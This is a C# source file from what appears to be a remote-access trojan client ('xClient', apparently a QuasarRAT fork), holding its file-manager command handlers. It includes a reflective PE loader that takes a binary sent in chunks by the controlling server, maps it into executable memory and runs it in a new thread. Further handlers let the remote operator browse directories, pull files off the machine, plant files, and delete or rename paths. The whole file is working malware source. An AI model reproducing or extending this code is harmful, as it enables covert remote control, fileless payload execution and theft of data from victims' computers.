using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Utilities;
using xClient.Enums;
using System.Windows.Forms;
using System.Collections.Generic;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE DIRECTORIES AND FILES (excluding the program). */
    public static partial class CommandHandler
    {
        public static Dictionary<int, byte[]> fileContents = new Dictionary<int, byte[]>();


        //Executes a .Net Assembly uploaded from the server reflectively.
        //Need to chunk byte array for transmission.
        //Based on the work done by @Arno0x0x and @SubTee
        public static void HandleDoExecuteAssembly(Packets.ServerPackets.DoExecuteAssembly command, Client client)
        {

            if(command.CurrentBlock == 0)
            {
                fileContents.Add(command.ID, command.Block);

                MessageBox.Show(fileContents[command.ID].Length.ToString()); //Debugging
            }
            else
            {
                fileContents[command.ID] = FileHelper.CombineByteArray(fileContents[command.ID], command.Block);

                MessageBox.Show(fileContents[command.ID].Length.ToString()); //Debugging
            }

            if (command.CurrentBlock == command.MaxBlocks)
            {
                NetPELoaderHelper pe = new NetPELoaderHelper(fileContents[command.ID]);
                IntPtr codebase = IntPtr.Zero;

                //Allocate memory for us to store our PE file.
                codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader64.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);

                for (int i = 0; i < pe.FileHeader.NumberOfSections; i++)
                {
                    //Copies our PE file into memory.
                    IntPtr y = NativeDeclarations.VirtualAlloc(IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[i].VirtualAddress), pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
                    Marshal.Copy(pe.RawBytes, (int)pe.ImageSectionHeaders[i].PointerToRawData, y, (int)pe.ImageSectionHeaders[i].SizeOfRawData);
                }

                //Recalculate our base.
                //Would this only work on 64 bit systems?
                long currentbase = codebase.ToInt64();
                long delta = (currentbase - (long)pe.OptionalHeader64.ImageBase);

                //Modify memory base on information from the relocation table.
                //offset based on the location of initial codebase
                IntPtr relocationTable = (IntPtr.Add(codebase, (int)pe.OptionalHeader64.BaseRelocationTable.VirtualAddress));

                NativeDeclarations.IMAGE_BASE_RELOCATION relocationEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
                relocationEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(relocationTable, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));


                //Get the size of the IMAGE_BASE_RELOCATION type
                int imageSizeOfBaseRelocation = Marshal.SizeOf((typeof(NativeDeclarations.IMAGE_BASE_RELOCATION)));
                //Where to put the next bit of our file.
                IntPtr nextEntry = relocationTable;
                int sizeOfNextBlock = (int)relocationEntry.SizeOfBlock;
                IntPtr offset = relocationTable;

                while (true) //keep going until break;
                {
                    NativeDeclarations.IMAGE_BASE_RELOCATION relocationNextEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
                    IntPtr ptr = IntPtr.Add(relocationTable, sizeOfNextBlock);
                    relocationNextEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(ptr, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));

                    IntPtr dest = IntPtr.Add(codebase, (int)relocationEntry.VirtualAddress);

                    for (int i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++)
                    {
                        IntPtr patchAddr = IntPtr.Zero;
                        UInt16 value = (UInt16)Marshal.ReadInt16(offset, 8 + (2 * i));
                        UInt16 type = (UInt16)(value >> 12);
                        UInt16 fixup = (UInt16)(value & 0xfff);

                        switch (type)
                        {
                            case 0x0:
                                break;
                            case 0x0A:
                                patchAddr = IntPtr.Add(dest, fixup);
                                //Add delta to location
                                long originalAddr = Marshal.ReadInt64(patchAddr);
                                Marshal.WriteInt64(patchAddr, originalAddr + delta);
                                break;

                        }
                    }

                    offset = IntPtr.Add(relocationTable, sizeOfNextBlock);
                    sizeOfNextBlock += (int)relocationNextEntry.SizeOfBlock;
                    relocationEntry = relocationNextEntry;

                    nextEntry = IntPtr.Add(nextEntry, sizeOfNextBlock);

                    if (relocationNextEntry.SizeOfBlock == 0) break;
                }

                IntPtr ptr2 = IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress);
                IntPtr oa1 = IntPtr.Add(codebase, (int)pe.OptionalHeader64.ImportTable.VirtualAddress);
                int oa2 = Marshal.ReadInt32(IntPtr.Add(oa1, 16));

                for (int j = 0; j < 999; j++) //HardCoded Number of DLL's Do this Dynamically.
                {
                    IntPtr a1 = IntPtr.Add(codebase, (20 * j) + (int)pe.OptionalHeader64.ImportTable.VirtualAddress);
                    int entryLength = Marshal.ReadInt32(IntPtr.Add(a1, 16));
                    IntPtr a2 = IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress + (entryLength - oa2));
                    IntPtr dllNamePTR = (IntPtr)(IntPtr.Add(codebase, +Marshal.ReadInt32(IntPtr.Add(a1, 12))));
                    string DllName = Marshal.PtrToStringAnsi(dllNamePTR);
                    if (DllName == "") { break; }

                    IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
                    for (int k = 1; k < 9999; k++)
                    {
                        IntPtr dllFuncNamePTR = (IntPtr.Add(codebase, +Marshal.ReadInt32(a2)));
                        string DllFuncName = Marshal.PtrToStringAnsi(IntPtr.Add(dllFuncNamePTR, 2));
                        //Console.WriteLine("Function {0}", DllFuncName);
                        IntPtr funcAddy = NativeDeclarations.GetProcAddress(handle, DllFuncName);
                        Marshal.WriteInt64(a2, (long)funcAddy);
                        a2 = IntPtr.Add(a2, 8);
                        if (DllFuncName == "") break;

                    }

                }

                //Transfer Control To OEP
                IntPtr threadStart = IntPtr.Add(codebase, (int)pe.OptionalHeader64.AddressOfEntryPoint);
                IntPtr hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
                NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);

                //Console.WriteLine("Thread Complete");

                fileContents.Remove(command.ID);
            }

        }
        public static void HandleGetDirectory(Packets.ServerPackets.GetDirectory command, Client client)
        {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                message = msg;
            };

            try
            {
                DirectoryInfo dicInfo = new DirectoryInfo(command.RemotePath);

                FileInfo[] iFiles = dicInfo.GetFiles();
                DirectoryInfo[] iFolders = dicInfo.GetDirectories();

                string[] files = new string[iFiles.Length];
                long[] filessize = new long[iFiles.Length];
                string[] folders = new string[iFolders.Length];

                int i = 0;
                foreach (FileInfo file in iFiles)
                {
                    files[i] = file.Name;
                    filessize[i] = file.Length;
                    i++;
                }
                if (files.Length == 0)
                {
                    files = new string[] {DELIMITER};
                    filessize = new long[] {0};
                }

                i = 0;
                foreach (DirectoryInfo folder in iFolders)
                {
                    folders[i] = folder.Name;
                    i++;
                }
                if (folders.Length == 0)
                    folders = new string[] {DELIMITER};

                new Packets.ClientPackets.GetDirectoryResponse(files, folders, filessize).Execute(client);
            }
            catch (UnauthorizedAccessException)
            {
                onError("GetDirectory No permission");
            }
            catch (SecurityException)
            {
                onError("GetDirectory No permission");
            }
            catch (PathTooLongException)
            {
                onError("GetDirectory Path too long");
            }
            catch (DirectoryNotFoundException)
            {
                onError("GetDirectory Directory not found");
            }
            catch (FileNotFoundException)
            {
                onError("GetDirectory File not found");
            }
            catch (IOException)
            {
                onError("GetDirectory I/O error");
            }
            catch (Exception)
            {
                onError("GetDirectory Failed");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(message))
                    new Packets.ClientPackets.SetStatusFileManager(message, true).Execute(client);
            }
        }

        public static void HandleDoDownloadFile(Packets.ServerPackets.DoDownloadFile command, Client client)
        {
            new Thread(() =>
            {
                _limitThreads.WaitOne();
                try
                {
                    FileSplit srcFile = new FileSplit(command.RemotePath);
                    if (srcFile.MaxBlocks < 0)
                        throw new Exception(srcFile.LastError);

                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                    {
                        if (!client.Connected || _canceledDownloads.ContainsKey(command.ID))
                            break;

                        byte[] block;

                        if (!srcFile.ReadBlock(currentBlock, out block))
                            throw new Exception(srcFile.LastError);

                        new Packets.ClientPackets.DoDownloadFileResponse(command.ID,
                            Path.GetFileName(command.RemotePath), block, srcFile.MaxBlocks, currentBlock,
                            srcFile.LastError).Execute(client);
                    }
                }
                catch (Exception ex)
                {
                    new Packets.ClientPackets.DoDownloadFileResponse(command.ID, Path.GetFileName(command.RemotePath), new byte[0], -1, -1, ex.Message)
                        .Execute(client);
                }
                _limitThreads.Release();
            }).Start();
        }

        public static void HandleDoDownloadFileCancel(Packets.ServerPackets.DoDownloadFileCancel command, Client client)
        {
            if (!_canceledDownloads.ContainsKey(command.ID))
            {
                _canceledDownloads.Add(command.ID, "canceled");
                new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "canceled", new byte[0], -1, -1, "Canceled").Execute(client);
            }
        }

        public static void HandleDoUploadFile(Packets.ServerPackets.DoUploadFile command, Client client)
        {
            if (command.CurrentBlock == 0 && File.Exists(command.RemotePath))
                NativeMethods.DeleteFile(command.RemotePath); // delete existing file

            FileSplit destFile = new FileSplit(command.RemotePath);
            destFile.AppendBlock(command.Block, command.CurrentBlock);
        }

        public static void HandleDoPathDelete(Packets.ServerPackets.DoPathDelete command, Client client)
        {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                message = msg;
            };

            try
            {
                switch (command.PathType)
                {
                    case PathType.Directory:
                        Directory.Delete(command.Path, true);
                        new Packets.ClientPackets.SetStatusFileManager("Deleted directory", false).Execute(client);
                        break;
                    case PathType.File:
                        File.Delete(command.Path);
                        new Packets.ClientPackets.SetStatusFileManager("Deleted file", false).Execute(client);
                        break;
                }

                HandleGetDirectory(new Packets.ServerPackets.GetDirectory(Path.GetDirectoryName(command.Path)), client);
            }
            catch (UnauthorizedAccessException)
            {
                onError("DeletePath No permission");
            }
            catch (PathTooLongException)
            {
                onError("DeletePath Path too long");
            }
            catch (DirectoryNotFoundException)
            {
                onError("DeletePath Path not found");
            }
            catch (IOException)
            {
                onError("DeletePath I/O error");
            }
            catch (Exception)
            {
                onError("DeletePath Failed");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(message))
                    new Packets.ClientPackets.SetStatusFileManager(message, false).Execute(client);
            }
        }

        public static void HandleDoPathRename(Packets.ServerPackets.DoPathRename command, Client client)
        {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                message = msg;
            };

            try
            {
                switch (command.PathType)
                {
                    case PathType.Directory:
                        Directory.Move(command.Path, command.NewPath);
                        new Packets.ClientPackets.SetStatusFileManager("Renamed directory", false).Execute(client);
                        break;
                    case PathType.File:
                        File.Move(command.Path, command.NewPath);
                        new Packets.ClientPackets.SetStatusFileManager("Renamed file", false).Execute(client);
                        break;
                }

                HandleGetDirectory(new Packets.ServerPackets.GetDirectory(Path.GetDirectoryName(command.NewPath)), client);
            }
            catch (UnauthorizedAccessException)
            {
                onError("RenamePath No permission");
            }
            catch (PathTooLongException)
            {
                onError("RenamePath Path too long");
            }
            catch (DirectoryNotFoundException)
            {
                onError("RenamePath Path not found");
            }
            catch (IOException)
            {
                onError("RenamePath I/O error");
            }
            catch (Exception)
            {
                onError("RenamePath Failed");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(message))
                    new Packets.ClientPackets.SetStatusFileManager(message, false).Execute(client);
            }
        }
    }
}